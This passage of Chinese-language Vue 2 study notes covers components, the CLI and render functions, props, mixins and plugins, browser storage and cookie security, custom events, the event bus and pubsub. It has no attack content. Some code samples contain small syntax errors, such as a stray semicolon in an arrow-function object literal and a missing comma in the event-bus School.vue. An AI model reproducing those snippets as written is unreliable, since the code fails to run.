				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        // 注册组件（局部）
        components:{
            student
        }
    })

    //定义hello组件
    const hello = Vue.extend({
        template:`<h1>{{msg}}</h1>`,
        data(){
            return {
                msg:'欢迎来到尚硅谷学习！'
            }
        }
    })

    //定义app组件
    const app = Vue.extend({
        template:`
				<div>	
					<hello></hello>
					<school></school>
    </div>
			`,
        components:{
            school,
            hello
        }
    })

    //创建vm
    new Vue({
        template:'<app></app>',
        el:'#root',
        //注册组件（局部）
        components:{app}
    })
</script>
```



### VueComponent

* school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
* 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
* 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！(这个VueComponent可不是实例对象)
* 关于this指向：
  * 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
  * new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
* VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。

Vue 在哪管理 VueComponent

![image-20220402125551334](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402125551334.png)



### 一个重要的内置关系

* 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
* 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

![vuecomponent](C:\Users\28318\Desktop\vue\vue_basic\18_非单文件组件\vuecomponent.png)

## 1.21 单文件组件

单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，webpack 会将 .vue 文件解析成 html,css,js这些形式。

来做个单文件组件的案例：

**School.vue**

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

**Student.vue**

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

**App.vue**

用来汇总所有的组件(大总管)

```vue
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

**main.js**

在这个文件里面创建 vue 实例

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

**index.html**

在这写 vue 要绑定的容器

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
        <script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="./main.js"></script>
	</body>
</html>
```





# 2. vue脚手架，自定义事件，插槽等复杂内容

## 2.1 脚手架

> 使用前置：
>
> 第一步(没有安装过的执行)：全局安装 @vue/cli
>
> npm install -g @vue/cli
>
> 第二步：切换到要创建项目的目录，然后使用命令创建项目
>
> vue create xxxxx
>
> 第三步：启动项目
>
> npm run serve

### 脚手架文件结构

```
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```



### 脚手架demo

components:

就直接把单文件组件的 School.vue 和 Student.vue 两个文件直接拿来用，不需要修改。

App.vue:

引入这两个组件，注册一下这两个组件，再使用。

```vue
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png">
    <Student></Student>
    <School></School>
  </div>
</template>

<script>
import School from './components/School.vue'
import Student from './components/Student.vue'

export default {
  name: 'App',
  components: {
    School,
    Student
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

main.js:

入口文件

```js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
  render: h => h(App),
}).$mount('#app')
```

接下来就要详细讲解 main.js 中的 render 函数

### render函数

> 插入一个小知识：

使用 import 导入第三方库的时候不需要 加 './'

导入我们自己写的：

```js
import App from './App.vue'
```

导入第三方的

```js
import Vue from 'vue'
```

不需要在 from 'vue' 加 `'./'` 的原因是第三方库 node_modules 人家帮我们配置好了。

我们通过 import 导入第三方库，在第三方库的 package.json 文件中确定了我们引入的是哪个文件

![image-20220402174006177](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402174006177.png)

通过 module 确定了我们要引入的文件。

> 回到 render 函数

之前的写法是这样：

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

如果这样子写，运行的话会引发如下的报错

![image-20220402172119887](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402172119887.png)

报错的意思是，是在使用运行版本的 vue ，没有模板解析器。

从上面的小知识可以知道，我们引入的 vue 不是完整版的，是残缺的（为了减小vue的大小）。所以残缺的vue.js 只有通过 render 函数才能把项目给跑起来。

来解析一下render

```js
// render最原始写的方式
// render是个函数，还能接收到参数a
// 这个 createElement 很关键，是个回调函数
new Vue({
  render(createElement) {
      console.log(typeof createElement);
      // 这个 createElement 回调函数能创建元素
      // 因为残缺的vue 不能解析 template，所以render就来帮忙解决这个问题
      // createElement 能创建具体的元素
      return createElement('h1', 'hello')
  }
}).$mount('#app')

```

![image-20220402175931186](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220402175931186.png)

因为 render 函数内并没有用到 this，所以可以简写成箭头函数。

```js
new Vue({
  // render: h => h(App),
  render: (createElement) => {
    return createElement(App)
  }
}).$mount('#app')
```

再简写：

```js
new Vue({
  // render: h => h(App),
  render: createElement => createElement(App)
}).$mount('#app')
```

最后把 createElement 换成 h 就完事了。

算啦算啦，把简写都整理一遍吧，js里的简写确实多哇。

对象内写方法最原始的：

```js
let obj = {
    name: 'aaa',
    work: function (salary) {
        return '工资' + salary;
    }
}
```

ES6 简化版：

```js
let obj = {
    name: 'aaa',
    work(salary) {
        return '工资' + salary;
    }
}
```

箭头函数简化版:

```js
let obj = {
    name: 'aaa',
    work: (salary) => {
        return '工资' + salary;
    }
}
```

箭头函数再简化（最终版）：

```js
// 只有一个参数就可以把圆括号去了，函数体内部只有一个 return 就可以把大括号去掉，return去掉
let obj = {
    name: 'aaa',
    work: salary => '工资' + salary;
}
```

这样就可以理解 render 函数的简写方式了。

来个不同版本 vue 的区别

* vue.js与vue.runtime.xxx.js的区别：
  * vue.js是完整版的Vue，包含：核心功能+模板解析器。
  * vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
* 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。

### 修改脚手架的默认配置

* 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
* 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

### 脚手架中的index.html

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
	<!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
	<!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
	<!-- 引入第三方样式 -->
	<link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
	<!-- 配置网页标题 -->
    <title>硅谷系统</title>
  </head>
  <body>
		<!-- 当浏览器不支持js时noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
		<!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```



## 2.2 vue 零碎的一些知识

### ref属性

* 被用来给元素或子组件注册引用信息（id的替代者）
* 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
* 使用方式：
  * 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
  * 获取：```this.$refs.xxx```

> 具体案例

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>

```

### props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

   1. 第一种方式（只接收）：```props:['name'] ```

   2. 第二种方式（限制类型）：```props:{name:String}```

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
      	name:{
              type:String, //类型
              required:true, //必要性
              default:'老王' //默认值
      	}
      }
      ```

   > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

示例代码：

父组件给子组件传数据

App.vue

```vue
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png">
    <Student></Student>
    <School name="haha" :age="this.age"></School>
  </div>
</template>

<script>
import School from './components/School.vue'
import Student from './components/Student.vue'

export default {
  name: 'App',
  data () {
    return {
      age: 360  
    }
  },
  components: {
    School,
    Student
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>

```

School.vue

```vue
<template>
  <div class="demo">
    <h2>学校名称：{{ name }}</h2>
    <h2>学校年龄：{{ age }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="showName">点我提示学校名</button>
  </div>
</template>

<script>
export default {
  name: "School",
  // 最简单的写法：props: ['name', 'age']
  props: {
    name: {
      type: String,
      required: true // 必须要传的
    },
    age: {
      type: Number,
      required: true
    }
  },
  data() {
    return {
      address: "北京昌平",
    };
  },
  methods: {
    showName() {
      alert(this.name);
    },
  },
};
</script>

<style>
.demo {
  background-color: orange;
}
</style>
```



### mixin(混入)

混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。

例子：

```js
// 定义一个混入对象
var myMixin = {
  created: function () {
    this.hello()
  },
  methods: {
    hello: function () {
      console.log('hello from mixin!')
    }
  }
}

// 定义一个使用混入对象的组件
var Component = Vue.extend({
  mixins: [myMixin]
})
```

**选项合并**

当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。

比如，数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。

```js
var mixin = {
  data: function () {
    return {
      message: 'hello',
      foo: 'abc'
    }
  }
}

new Vue({
  mixins: [mixin],
  data: function () {
    return {
      message: 'goodbye',
      bar: 'def'
    }
  },
  created: function () {
    console.log(this.$data)
    // => { message: "goodbye", foo: "abc", bar: "def" }
  }
})
```

同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子**之前**调用。

```js
var mixin = {
  created: function () {
    console.log('混入对象的钩子被调用')
  }
}

new Vue({
  mixins: [mixin],
  created: function () {
    console.log('组件钩子被调用')
  }
})

// => "混入对象的钩子被调用"
// => "组件钩子被调用"
```

值为对象的选项，例如 `methods`、`components` 和 `directives`，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。

```js
var mixin = {
  methods: {
    foo: function () {
      console.log('foo')
    },
    conflicting: function () {
      console.log('from mixin')
    }
  }
}

var vm = new Vue({
  mixins: [mixin],
  methods: {
    bar: function () {
      console.log('bar')
    },
    conflicting: function () {
      console.log('from self')
    }
  }
})

vm.foo() // => "foo"
vm.bar() // => "bar"
vm.conflicting() // => "from self"
```

> 全局混入不建议使用



### 插件

插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制。

通过全局方法 `Vue.use()` 使用插件。它需要在你调用 `new Vue()` 启动应用之前完成：

```js
// 调用 `MyPlugin.install(Vue)`
Vue.use(MyPlugin)

new Vue({
  // ...组件选项
})
```

本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

定义插件：

```js
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}
```

具体案例：

plugin.js

```js
export default {
    install(Vue, x, y, z) {
        console.log(x, y, z)
        //全局过滤器
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        //定义全局指令
        Vue.directive('fbind', {
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus()
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value
            }
        })

        //定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            },
        })

        //给Vue原型上添加一个方法（vm和vc就都能用了）
        Vue.prototype.hello = () => { alert('你好啊aaaa') }
    }
}
```

main.js

```js
// 引入插件
import plugin from './plugin'

// 使用插件
Vue.use(plugin)
```

然后就可以在别的组件使用插件里的功能了。

### scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```

具体案例：

```vue
<style lang="less" scoped>
	.demo{
		background-color: pink;
		.atguigu{
			font-size: 40px;
		}
	}
</style>
```

### 总结TodoList案例

1. 组件化编码流程：

   ​	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

   ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

   ​			1).一个组件在用：放在组件自身即可。

   ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

   ​	(3).实现交互：从绑定事件开始。

2. props适用于：

   ​	(1).父组件 ==> 子组件 通信

   ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。



## 2.3 浏览器本地存储

### Cookie

Cookie是最早被提出来的本地存储方式，在此之前，服务端是无法判断网络中的两个请求是否是同一用户发起的，为解决这个问题，Cookie就出现了。Cookie 是存储在用户浏览器中的一段不超过 4 KB 的字符串。它由一个名称（Name）、一个值（Value）和其它几个用 于控制 Cookie 有效期、安全性、使用范围的可选属性组成。**不同域名下的 Cookie 各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的 Cookie 一同发送到服务器**。



**Cookie的特性：**

- Cookie一旦创建成功，名称就无法修改
- Cookie是无法跨域名的，也就是说a域名和b域名下的cookie是无法共享的，这也是由Cookie的隐私安全性决定的，这样就能够阻止非法获取其他网站的Cookie
- 每个域名下Cookie的数量不能超过20个，每个Cookie的大小不能超过4kb
- 有安全问题，如果Cookie被拦截了，那就可获得session的所有信息，即使加密也于事无补，无需知道cookie的意义，只要转发cookie就能达到目的
- Cookie在请求一个新的页面的时候都会被发送过去





**Cookie 在身份认证中的作用**

客户端第一次请求服务器的时候，服务器通过响应头的形式，向客户端发送一个身份认证的 Cookie，客户端会自动 将 Cookie 保存在浏览器中。

随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的 Cookie，通过请求头的形式发送给 服务器，服务器即可验明客户端的身份。


![在这里插入图片描述](https://img-blog.csdnimg.cn/e29b7e0bef784bc5b6b8ed50b0d8a509.png)



**Cookie 不具有安全性**

**由于 Cookie 是存储在浏览器中的，而且浏览器也提供了读写 Cookie 的 API，因此 Cookie 很容易被伪造，不具有安全 性。**因此不建议服务器将重要的隐私数据，通过 Cookie 的形式发送给浏览器。
![在这里插入图片描述](https://img-blog.csdnimg.cn/b9b6daf6fb35419b985cf37a32ddd7d3.png)


> 注意：千万不要使用 Cookie 存储重要且隐私的数据！比如用户的身份信息、密码等。





**提高身份认证的安全性**

为了防止客户伪造会员卡，收银员在拿到客户出示的会员卡之后，可以在收银机上进行刷卡认证。只有收银机确认存在的 会员卡，才能被正常使用。

![在这里插入图片描述](https://img-blog.csdnimg.cn/9ef4ea4be35242d9a2c2a9c49058d638.png)


这种“会员卡 + 刷卡认证”的设计理念，就是 Session 认证机制的精髓。



### Session

Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。**客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。**这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。

如果说Cookie机制是通过检查客户身上的“会员卡”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份（就类似于刷卡机）。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。



**session 工作流程**

![在这里插入图片描述](https://img-blog.csdnimg.cn/10472e8e03924340a452523ae678de02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaGFuZ2FvMjMz,size_20,color_FFFFFF,t_70,g_se,x_16)



我在 node.js 中详细演示了一遍 session 的使用，具体看了另一篇博客：https://blog.csdn.net/hangao233/article/details/123089029



### LocalStorage

LocalStorage是HTML5新引入的特性，由于有的时候我们存储的信息较大，Cookie就不能满足我们的需求，这时候LocalStorage就派上用场了。



**LocalStorage的优点：**

- 在大小方面，LocalStorage的大小一般为**5MB**，可以储存更多的信息
- LocalStorage是持久储存，并不会随着页面的关闭而消失，除非主动清理，不然会永久存在
- 仅储存在本地，不像Cookie那样每次HTTP请求都会被携带



**LocalStorage的缺点：**

- 存在浏览器兼容问题，IE8以下版本的浏览器不支持
- 如果浏览器设置为隐私模式，那我们将无法读取到LocalStorage
- LocalStorage受到同源策略的限制，即端口、协议、主机地址有任何一个不相同，都不会访问



**LocalStorage的常用API：**

```JS
// 保存数据到 localStorage
localStorage.setItem('key', 'value');

// 从 localStorage 获取数据
let data = localStorage.getItem('key');

// 从 localStorage 删除保存的数据
localStorage.removeItem('key');

// 从 localStorage 删除所有保存的数据
localStorage.clear();

// 获取某个索引的Key
localStorage.key(index)
```





**LocalStorage的使用场景:**

- 有些网站有换肤的功能，这时候就可以将换肤的信息存储在本地的LocalStorage中，当需要换肤的时候，直接操作LocalStorage即可
- 在网站中的用户浏览信息也会存储在LocalStorage中，还有网站的一些不常变动的个人信息等也可以存储在本地的LocalStorage中





### SessionStorage

SessionStorage和LocalStorage都是在HTML5才提出来的存储方案，SessionStorage 主要用于临时保存同一窗口(或标签页)的数据，刷新页面时不会删除，关闭窗口或标签页之后将会删除这些数据。



**SessionStorage与LocalStorage对比：**

- SessionStorage和LocalStorage都在**本地进行数据存储**；
- SessionStorage也有同源策略的限制，但是SessionStorage有一条更加严格的限制，SessionStorage**只有在同一浏览器的同一窗口下才能够共享**；
- LocalStorage和SessionStorage**都不能被爬虫爬取**；





**SessionStorage的常用API：**

```JS
// 保存数据到 sessionStorage
sessionStorage.setItem('key', 'value');

// 从 sessionStorage 获取数据
let data = sessionStorage.getItem('key');

// 从 sessionStorage 删除保存的数据
sessionStorage.removeItem('key');

// 从 sessionStorage 删除所有保存的数据
sessionStorage.clear();

// 获取某个索引的Key
sessionStorage.key(index)
```



**SessionStorage的使用场景**

由于SessionStorage具有时效性，所以可以用来存储一些网站的游客登录的信息，还有临时的浏览记录的信息。当关闭网站之后，这些信息也就随之消除了。





> 具体案例：

**localStorage**

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>localStorage</title>
	</head>
	<body>
		<h2>localStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				localStorage.setItem('msg','hello!!!')
				localStorage.setItem('msg2',666)
                // 转成 JSON 对象存进去
				localStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(localStorage.getItem('msg'))
				console.log(localStorage.getItem('msg2'))

				const result = localStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(localStorage.getItem('msg3'))
			}
			function deleteData(){
				localStorage.removeItem('msg2')
			}
			function deleteAllData(){
				localStorage.clear()
			}
		</script>
	</body>
</html>
```

**sessionStorage**

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>sessionStorage</title>
	</head>
	<body>
		<h2>sessionStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				sessionStorage.setItem('msg','hello!!!')
				sessionStorage.setItem('msg2',666)
                // 转换成JSON 字符串存进去
				sessionStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(sessionStorage.getItem('msg'))
				console.log(sessionStorage.getItem('msg2'))

				const result = sessionStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(sessionStorage.getItem('msg3'))
			}
			function deleteData(){
				sessionStorage.removeItem('msg2')
			}
			function deleteAllData(){
				sessionStorage.clear()
			}
		</script>
	</body>
</html>
```





## 2.4 组件自定义事件

组件自定义事件是一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

**使用场景**

A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

**绑定自定义事件：**

第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

> 具体代码

App.vue

```vue
<template>
	<div class="app">
		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） -->
		<Student @atguigu="getStudentName"/> 
	</div>
</template>

<script>
	import Student from './components/Student'

	export default {
		name:'App',
		components:{Student},
		data() {
			return {
				msg:'你好啊！',
				studentName:''
			}
		},
		methods: {
			getStudentName(name,...params){
				console.log('App收到了学生名：',name,params)
				this.studentName = name
			}
		}
	}
</script>

<style scoped>
	.app{
		background-color: gray;
		padding: 5px;
	}
</style>

```

Student.vue

```vue
<template>
	<div class="student">
		<button @click="sendStudentlName">把学生名给App</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
			}
		},
		methods: {
			sendStudentlName(){
				//触发Student组件实例身上的atguigu事件
				this.$emit('atguigu',this.name,666,888,900)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```



第二种方式，在父组件中：

使用 **this.$refs.xxx.$on**() 这样写起来更灵活，比如可以加定时器啥的。

> 具体代码

App.vue

```vue
<template>
	<div class="app">
		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
		<Student ref="student"/>
	</div>
</template>

<script>
	import Student from './components/Student'

	export default {
		name:'App',
		components:{Student},
		data() {
			return {
				studentName:''
			}
		},
		methods: {
			getStudentName(name,...params){
				console.log('App收到了学生名：',name,params)
				this.studentName = name
			},
		},
		mounted() {
			this.$refs.student.$on('atguigu',this.getStudentName) //绑定自定义事件
			// this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
		},
	}
</script>

<style scoped>
	.app{
		background-color: gray;
		padding: 5px;
	}
</style>

```

Student.vue

```vue
<template>
	<div class="student">
		<button @click="sendStudentlName">把学生名给App</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
			}
		},
		methods: {
			sendStudentlName(){
				//触发Student组件实例身上的atguigu事件
				this.$emit('atguigu',this.name,666,888,900)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```

> 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。
>
> 触发自定义事件：```this.$emit('atguigu',数据)```		
>
> 使用 this.$emit() 就可以子组件向父组件传数据



**解绑自定义事件**```this.$off('atguigu')```

> 代码

```js
this.$off('atguigu') //解绑一个自定义事件
// this.$off(['atguigu','demo']) //解绑多个自定义事件
// this.$off() //解绑所有的自定义事件
```



**组件上也可以绑定原生DOM事件，需要使用```native```修饰符。**

> 代码

```vue
<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
<Student ref="student" @click.native="show"/>
```



> 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！





## 2.5 全局事件总线

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。



> 示例代码

School.vue

```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
        methods: {
            demo(data) {
                console.log('我是School组件，收到了数据',data)
            }
        }
		mounted() {
			// console.log('School',this)
			this.$bus.$on('hello',this.demo)
		},
		beforeDestroy() {
			this.$bus.$off('hello')
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

Student.vue

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				this.$bus.$emit('hello',this.name)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```

![image-20220405145110300](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220405145110300.png)

![image-20220405145706005](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220405145706005.png)

## 2.6 消息订阅与发布

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods:{
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：```pubsub.publish('xxx',数据)```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>



> 示例代码

订阅消息

**School.vue**

```html
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		mounted() {
			// console.log('School',this)
			/* this.$bus.$on('hello',(data)=>{
				console.log('我是School组件，收到了数据',data)
			}) */
			this.pubId = pubsub.subscribe('hello',(msgName,data)=>{
				console.log(this)
				// console.log('有人发布了hello消息，hello消息的回调执行了',msgName,data)
			})
		},
		beforeDestroy() {
			// this.$bus.$off('hello')
			pubsub.unsubscribe(this.pubId)
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

发布消息

**Student.vue**

```html
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
